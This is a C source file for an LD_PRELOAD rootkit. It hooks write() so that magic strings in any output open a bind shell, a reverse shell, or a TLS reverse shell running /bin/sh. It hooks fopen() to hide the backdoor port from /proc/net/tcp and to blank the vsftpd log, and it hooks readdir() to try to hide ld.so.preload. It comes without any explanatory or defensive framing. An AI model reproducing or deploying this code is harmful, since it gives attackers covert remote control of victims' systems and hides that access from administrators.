#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#define BIND_KEY "BIND_USER"
#define REVERSE_KEY "REVERSE_USER"
#define OPENSSL_KEY "OPENSSL_USER"
#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PORT 443
#define LOCAL_PORT 80


int TCP_IP_BIND_SHELL(void){

    int listening_socket = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(5555);

    bind(listening_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));

    listen(listening_socket, 5);

    int accepted_socket = accept(listening_socket, NULL, NULL);

    for(int i = 0; i < 3; i++){
        dup2(accepted_socket, i);
    }
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    close(listening_socket);
	
}

int TCP_IP_REVERSE_SHELL(void){

    const char* host = REMOTE_HOST;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(REMOTE_PORT);
    inet_aton(host, &server_addr.sin_addr);

    struct sockaddr_in client_addr;
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = INADDR_ANY;
    client_addr.sin_port = htons(LOCAL_PORT);


    int listening_socket = socket(AF_INET, SOCK_STREAM, 0);

    bind(listening_socket, (struct sockaddr *)&client_addr, sizeof(client_addr));

    connect(listening_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
    
    for(int i = 0; i < 3; i++){
        dup2(listening_socket, i);
    }
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    close(listening_socket);
	
}

void OPEN_SSL_CONNECTION(){
    
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    const SSL_METHOD *method = TLS_client_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (ctx == NULL) {
        ERR_print_errors_fp(stderr);
        exit(1);
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(443); 
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr); 

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) != 0) {
        perror("Connect");
        exit(1);
    }

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) == -1) {
        ERR_print_errors_fp(stderr);
    } else {
        for (int i = 0; i < 3; i++) {
            dup2(sock, i);
        }
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }

    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
    EVP_cleanup();
	
}

ssize_t write(int fildes, const void *buf, size_t nbytes)
{
	
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");

    char* malConnectBind = strstr(buf, BIND_KEY);
    char* malConnectReverse = strstr(buf, REVERSE_KEY);
    char* malConnectOpenSSL = strstr(buf, OPENSSL_KEY);

    if(malConnectBind != NULL){
        fildes = open("dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        TCP_IP_BIND_SHELL();
    }
    else if(malConnectReverse != NULL){
        fildes = open("dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        TCP_IP_REVERSE_SHELL();
    }
    else if(malConnectOpenSSL != NULL){
        fildes = open("dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        OPEN_SSL_CONNECTION();
    }
    else result = new_write(fildes, buf, nbytes);
	
	return result;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode){

    orig_fopen = dlsym(RTLD_NEXT, "fopen");
    
    char* netstatPtr = strstr(pathname, "/proc/net/tcp");
    char* lsofPtr = strstr(pathname, "/proc/net/tcp");
    char* ftpPtr = strstr(pathname, "/var/log/vsftpd.log");
    FILE* fp;

    if(netstatPtr != NULL || lsofPtr != NULL){
        char* networkLine[400];
        FILE *ret = tmpfile();
        fp = orig_fopen(pathname, mode);
        while(fgets(networkLine, sizeof(networkLine), fp)){
            char* malPort = strstr(networkLine, "15B3");
            if(malPort == NULL){
                fputs(networkLine, ret);
            }
            else continue;
        }
        return ret;
    }
    
    else if(ftpPtr != NULL){
        return orig_fopen("dev/null", mode);
    }

    fp = orig_fopen(pathname, mode);
    return fp;
	
}

struct dirent*(*orig_readdir)(DIR *directory);
struct dirent *readdir(DIR *dirp){

    orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *directory;

    while(directory = orig_readdir(dirp)){
        if(strstr(directory -> d_name, "ld.so.preload") == 0) break;
    }

    return directory;

}
